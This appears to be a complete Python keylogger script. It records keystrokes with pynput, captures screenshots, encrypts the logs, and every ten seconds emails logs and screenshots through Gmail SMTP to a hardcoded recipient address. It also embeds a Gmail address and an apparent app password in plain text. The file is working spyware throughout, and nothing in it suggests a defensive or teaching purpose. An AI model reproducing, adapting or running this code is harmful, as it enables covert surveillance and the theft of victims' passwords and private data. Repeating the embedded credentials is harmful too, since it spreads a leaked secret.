import smtplib
import threading
from pynput.keyboard import Key, Listener
from PIL import ImageGrab  # For screenshots
from cryptography.fernet import Fernet  # For encryption
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import time
import os

# Load the encryption key (the same key used to encrypt the data)
with open("encryption_key.key", "rb") as key_file:
    ENCRYPTION_KEY = key_file.read()

# Initialize Fernet for encryption
cipher = Fernet(ENCRYPTION_KEY)

# Email details
EMAIL_ADDRESS = "tejasreea9182@gmail.com"
EMAIL_PASSWORD = "oblo eoqg nnuz xgkc"
TO_EMAIL = "tejasreea85@gmail.com"
EMAIL_INTERVAL = 10  # Time interval in seconds to send logs/screenshots

# Directory to save screenshots
SCREENSHOT_DIR = r"C:\Users\tejas\OneDrive\Desktop\Keyloggers\key images"

# Ensure the screenshot directory exists
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

# Store keystrokes in a list
log = []

# Class to manage keylogger functionality
class Keylogger:
    def __init__(self):
        self.log = []
        self.is_capslock_on = False
        self.is_shift_pressed = False

    def append_log(self, keystroke):
        """Append captured keystroke to the log."""
        self.log.append(keystroke)

    def keypress(self, key):
        """Handles keypress events and formats special keys in a simpler way."""
        try:
            ck = str(key.char)
            if self.is_capslock_on:
                if self.is_shift_pressed:
                    ck = ck.lower()  # Shift + CapsLock = lowercase
                else:
                    ck = ck.upper()  # CapsLock = uppercase
            else:
                if self.is_shift_pressed:
                    ck = ck.upper()  # Shift = uppercase
                else:
                    ck = ck.lower()  # No Shift = lowercase
        except AttributeError:
            if key == Key.space:
                ck = " "
            elif key == Key.enter:
                ck = "\n"
            elif key == Key.tab:
                ck = "TAB"
            elif key in [Key.alt_l, Key.alt_r]:
                ck = "ALT"
            elif key in [Key.ctrl_l, Key.ctrl_r]:
                ck = "CTRL"
            elif key in [Key.shift, Key.shift_r]:
                self.is_shift_pressed = True
                ck = ""
            elif key == Key.caps_lock:
                self.is_capslock_on = not self.is_capslock_on
                ck = "CAPS_LOCK"
            elif key == Key.backspace:
                if self.log:
                    self.log.pop()
                ck = ""
            else:
                ck = str(key).replace("Key.", "").upper()

        if ck:
            self.append_log(ck)

    def keyrelease(self, key):
        """Handles key release events."""
        if key in [Key.shift, Key.shift_r]:
            self.is_shift_pressed = False

    # Encrypt the log before sending
    def encrypt_log(self, message):
        encrypted_message = cipher.encrypt(message.encode())
        return encrypted_message

    # Send email log and screenshots
    def send_email(self, email, password, message, screenshot=None):
        try:
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(email, password)

                # Create email
                msg = MIMEMultipart()
                msg['From'] = email
                msg['To'] = TO_EMAIL
                msg['Subject'] = "Encrypted Keylogger Report"

                # Attach encrypted log
                encrypted_message = self.encrypt_log(message)
                log_filename = f"log_{int(time.time())}.txt"
                with open(log_filename, "wb") as log_file:
                    log_file.write(encrypted_message)

                with open(log_filename, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f"attachment; filename={log_filename}")
                    msg.attach(part)

                # Attach screenshot if available
                if screenshot:
                    with open(screenshot, "rb") as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(screenshot)}")
                        msg.attach(part)

                server.sendmail(email, TO_EMAIL, msg.as_string())

                # Clean up temporary files
                os.remove(log_filename)
                if screenshot:
                    os.remove(screenshot)

        except Exception as e:
            print(f"Error sending email: {e}")

    # Take screenshots
    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{int(time.time())}.png")
            screenshot.save(screenshot_path)
            return screenshot_path
        except Exception as e:
            print(f"Error taking screenshot: {e}")
            return None

    # Report function that sends log and screenshots every set interval
    def report(self):
        if self.log:
            message = ''.join(self.log)
            screenshot_path = self.take_screenshot()
            self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, message, screenshot=screenshot_path)
            self.log = []  # Clear log after sending
        timer = threading.Timer(EMAIL_INTERVAL, self.report)
        timer.start()

    # Start listening to keystrokes
    def start(self):
        with Listener(on_press=self.keypress, on_release=self.keyrelease) as listener:
            self.report()
            listener.join()

# Instantiate and start the keylogger
if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
